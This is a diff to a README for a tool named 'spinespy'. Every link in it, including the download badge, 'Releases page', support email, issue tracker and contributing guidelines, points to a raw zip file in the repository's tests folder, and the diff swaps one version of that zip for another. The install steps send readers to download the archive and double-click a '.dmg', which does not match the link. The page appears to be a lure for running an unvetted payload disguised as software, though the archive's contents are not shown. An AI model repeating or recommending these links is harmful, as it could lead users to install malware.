@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download spinespy](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip%20spinespy-v1.0-blue)](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip)
+[![Download spinespy](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip%20spinespy-v1.0-blue)](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip)
 
 ## 📖 Description
 
@@ -22,8 +22,8 @@ To get started with spinespy, follow the steps below to download and install the
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip) to download the latest version of spinespy.
-2. Locate the file labeled with the version you want (e.g., `https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip`).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip) to download the latest version of spinespy.
+2. Locate the file labeled with the version you want (e.g., `https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip`).
 3. Click on the file to download it to your computer.
 4. Once downloaded, locate the `.dmg` file in your Downloads folder.
 5. Double-click the `.dmg` file to open it.
@@ -56,12 +56,12 @@ If you encounter issues while using spinespy, consider the following tips:
 
 For further assistance, contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip
-- **GitHub Issues:** Use the Issues section on our [GitHub repository](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip) to report bugs or request features.
+- **Email:** https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip
+- **GitHub Issues:** Use the Issues section on our [GitHub repository](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip) to report bugs or request features.
 
 ## 📈 Contributing
 
-If you wish to contribute to spinespy, we welcome your feedback and suggestions. To get involved, check our [contributing guidelines](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_1.0.zip).
+If you wish to contribute to spinespy, we welcome your feedback and suggestions. To get involved, check our [contributing guidelines](https://raw.githubusercontent.com/ggt358/spinespy/main/tests/Software_v1.2-alpha.4.zip).
 
 ## 🔗 Related Topics
 
